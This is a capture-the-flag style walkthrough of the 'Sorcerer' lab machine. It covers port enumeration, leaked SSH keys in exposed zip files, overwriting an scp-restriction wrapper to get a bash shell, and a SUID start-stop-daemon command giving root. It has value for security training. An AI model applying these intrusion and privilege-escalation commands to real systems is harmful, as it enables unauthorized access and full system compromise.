# Sorcerer

### Enumeration

```
22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 81:2a:42:24:b5:90:a1:ce:9b:ac:e7:4e:1d:6d:b4:c6 (RSA)
|   256 d0:73:2a:05:52:7f:89:09:37:76:e3:56:c8:ab:20:99 (ECDSA)
|_  256 3a:2d:de:33:b0:1e:f2:35:0f:8d:c8:d7:8f:f9:e0:0e (ED25519)
...
7742/tcp  open  http     nginx
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: SORCERER
8080/tcp  open  http     Apache Tomcat 7.0.4
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache Tomcat/7.0.4
```

```
Gobuster-7742: /zipfiles

http://192.168.112.100:7742/zipfiles/
max.zip

tomcat-users.xml.bak
---
<user username="tomcat" password="[REDACTED]" roles="manager-gui"/>

authorized_keys
---
no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty,command="/home/max/scp_wrapper.sh" ssh-rsa

scp_wrapper.sh
---
#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "ACCESS DENIED."
    scp
    ;;
esac
```

This script is using for limiting the ssh user command to just scp. When we connect with ssh, /home/max/scp\_wrapper.sh will be executed. So we can change this script with as we want to unlimited access. Or we can use tomcat manager with evil jar deploying to get initial shell.

### Initial Access

Edit the file as follows

zipfiles/max/max/scp\_wrapper.sh

```
#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "haha!"
    bash
    ;;
esac
```

```
┌──(kali㉿kali)-[~/…/zipfiles/max/max/.ssh]
└─$ scp ../scp_wrapper.sh -i id_rsa max@192.168.112.100:/home/max/scp_wrapper.sh
┌──(kali㉿kali)-[~/…/zipfiles/max/max/.ssh]
└─$ ssh -i id_rsa max@192.168.112.100                                 
PTY allocation request failed on channel 0
haha!
```

### PrivEsc

SUID -> /usr/sbin/start-stop-daemon

```
-rwsr-xr-x 1 root root 44K Jun  3  2019 /usr/sbin/start-stop-daemon
```

[https://gtfobins.github.io/gtfobins/start-stop-daemon/](https://gtfobins.github.io/gtfobins/start-stop-daemon/)

```
$ /usr/sbin/start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p
```
